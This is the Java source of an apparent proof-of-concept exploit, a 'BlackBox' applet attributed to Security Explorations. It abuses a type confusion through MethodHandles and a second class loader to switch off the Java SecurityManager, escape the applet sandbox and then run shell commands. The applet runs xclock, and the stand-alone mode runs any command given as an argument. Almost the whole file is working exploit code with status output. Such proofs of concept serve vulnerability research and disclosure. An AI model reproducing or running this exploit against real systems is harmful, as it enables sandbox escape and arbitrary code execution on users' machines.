/*## (c) SECURITY EXPLORATIONS    2013 poland                                #*/
/*##     http://www.security-explorations.com                                #*/

/* THIS SOFTWARE IS PROTECTED BY DOMESTIC AND INTERNATIONAL COPYRIGHT LAWS    */
/* UNAUTHORISED COPYING OF THIS SOFTWARE IN EITHER SOURCE OR BINARY FORM IS   */
/* EXPRESSLY FORBIDDEN. ANY USE, INCLUDING THE REPRODUCTION, MODIFICATION,    */
/* DISTRIBUTION, TRANSMISSION, RE-PUBLICATION, STORAGE OR DISPLAY OF ANY      */
/* PART OF THE SOFTWARE, FOR COMMERCIAL OR ANY OTHER PURPOSES REQUIRES A      */
/* VALID LICENSE FROM THE COPYRIGHT HOLDER.                                   */

/* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS    */
/* OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,*/
/* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL    */
/* SECURITY EXPLORATIONS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, */
/* WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF  */
/* OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE     */
/* SOFTWARE.                                                                  */

import java.net.URL;
import java.net.URLClassLoader;

import java.io.InputStreamReader;
import java.io.BufferedReader;

import java.security.AccessController;
import java.security.AccessControlContext;
import java.security.AccessControlException;

import java.lang.invoke.*;

import java.applet.Applet;
import java.awt.TextArea;

public class BlackBox extends Applet {

	private static int runproc(Process proc) throws Exception {
		BufferedReader cmdout = new BufferedReader(new InputStreamReader(proc.getInputStream()));
		String line;
		while ((line = cmdout.readLine()) != null) {
	    		System.out.println(line);
		}
		proc.waitFor();
		return proc.exitValue();
	}


	private static void gainPrivileges(ClassLoader cl) throws Throwable {
		URLClassLoader cl1 = (URLClassLoader)cl;

		/* prepare parallel ClassLoader namespace (cl2)                        */
		URL utab[]=cl1.getURLs();

		URL url=new URL(utab[0]+"/data/");
		utab=new URL[1];
		utab[0]=url;

		URLClassLoader cl2=URLClassLoader.newInstance(utab,null);

		/* find Helper classe in cl2 namespace                                 */
		Class helper_cl2=cl2.loadClass("Helper");

		/* find confuse_types method of Helper class                           */
		MethodHandles.Lookup lookup=MethodHandles.lookup();
		lookup=lookup.in(helper_cl2);

		Class ctab[]=new Class[1];
		ctab[0]=A.class;

		MethodType desc=MethodType.methodType(Void.TYPE,ctab);
		MethodHandle confuse_types_mh=lookup.findStatic(helper_cl2,"confuse_types",desc);

		/* create instance of a type to confuse over                           */
		A a=new A();

		/* exploit type confusion for ACC from cl1 namespace                   */
		a.macc=AccessController.getContext();
		confuse_types_mh.invokeExact(a);
	}


	// stand-alone test
	public static void main(String[] args) {
		String cmd = "/bin/date";

		if (args.length != 0) {
			cmd = args[0];
		}

		System.out.println("[i] Using Java: " + System.getProperty("java.vendor") + ", " + System.getProperty("java.version"));

		// make sure this runs sandboxed
		if (System.getSecurityManager() == null) {
			System.setSecurityManager(new SecurityManager());
			System.out.println("[i] Installed SecurityManager: " + System.getSecurityManager());
		} else {
			System.out.println("[i] Running with SecurityManager: " + System.getSecurityManager());
		}

		// sanity check
		try {
			runproc(Runtime.getRuntime().exec(cmd));
			System.out.println("[-] Test error, command was run.");
			return;
		} catch (AccessControlException e) {
			System.out.println("[i] Sandbox check passed, unable to run command directly.");
		} catch (Throwable e) {
			System.out.println("[!] Unexpected error:");
			e.printStackTrace();
			return;
		}

		// disable SM
		ClassLoader cl = (new BlackBox()).getClass().getClassLoader();
		System.out.println("[i] Using ClassLoader: " + cl);
		try {
			gainPrivileges(cl);
		} catch (Throwable e) {
			System.out.println("[i] Failed to execute payload: " + e.toString());
		}

		if (System.getSecurityManager() == null) {
			System.out.println("[i] SecurityManager is now disabled.");
		} else {
			System.out.println("[i] SecurityManager is still enabled.");
		}

		// execute command
		System.out.println("[i] Running command: " + cmd);
		try {
			runproc(Runtime.getRuntime().exec(cmd));
			System.out.println("FAIL - command was executed");
		} catch (AccessControlException e) {
			System.out.println("PASS - failed to run command: " + e.getMessage());
		} catch (Throwable e) {
			System.out.println("FAIL - unexpected exception:");
			e.printStackTrace();
		}
	}
	

	// applet test
	public void init() {
		TextArea ta = new TextArea("", 15, 90);
		this.add(ta);

		ta.append("Using Java: " + System.getProperty("java.vendor") + ", " + System.getProperty("java.version") + "\n");
		ta.append("Running with SecurityManager: " + System.getSecurityManager() + "\n");

		// disable SM
		ClassLoader cl = this.getClass().getClassLoader();
		ta.append("Using ClassLoader: " + cl + "\n");
		try {
			gainPrivileges(cl);
		} catch (Throwable e) {
			ta.append("Failed to disable SecurityManager:\n" + e.toString() + "\n");
			for (StackTraceElement ste: e.getStackTrace()) {
				ta.append("        at " + ste.toString() + "\n");
			}
		}

		if (System.getSecurityManager() == null) {
			ta.append("SecurityManager is now disabled.\n");

		} else {
			ta.append("SecurityManager is still enabled.\n");
		}

		// try to execute command
		try {
			Runtime.getRuntime().exec("/usr/bin/xclock");
			ta.append("xclock should now be running.\n");
		} catch (Throwable e) {
			ta.append("Command execution failed with: " + e.toString());
		}

	}

}
